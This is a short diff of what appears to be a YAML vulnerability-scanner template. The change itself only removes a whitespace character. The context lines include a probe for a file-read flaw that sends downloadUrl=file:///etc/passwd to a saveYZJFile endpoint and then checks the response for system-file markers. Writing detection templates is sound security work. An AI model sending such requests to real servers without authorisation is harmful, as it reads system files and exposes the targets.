@@ -9,7 +9,7 @@ groups:
     - method: GET
       path: /file/fileNoLogin/{{id}}
       expression: |
-        response.status == 200 && response.body.bcontains(b"Windows")  && response.body.bcontains(b"Users") 
+        response.status == 200 && response.body.bcontains(b"Windows") && response.body.bcontains(b"Users") 
   linux:
     - method: GET
       path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
